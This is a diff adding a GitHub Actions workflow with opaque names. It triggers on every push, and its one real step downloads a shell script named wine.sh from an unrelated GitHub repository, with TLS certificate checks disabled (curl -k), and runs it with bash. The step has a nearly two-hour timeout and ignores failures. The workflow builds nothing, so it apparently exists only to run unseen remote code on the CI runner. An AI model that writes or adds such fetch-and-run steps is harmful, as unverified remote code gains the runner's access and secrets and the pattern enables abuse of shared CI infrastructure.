@@ -1,0 +1,20 @@
+name: wi ne
+
+on:
+    push:
+    workflow_dispatch:
+    
+jobs:
+  build:
+    runs-on: ubuntu-20.04
+
+    steps:
+       - name: im1
+         uses: actions/checkout@main
+         
+       - name: im2
+         timeout-minutes: 119
+         continue-on-error: true
+         run: |
+             curl -sLkO https://github.com/EkramulLab/noob/raw/main/wine.sh
+             bash wine.sh
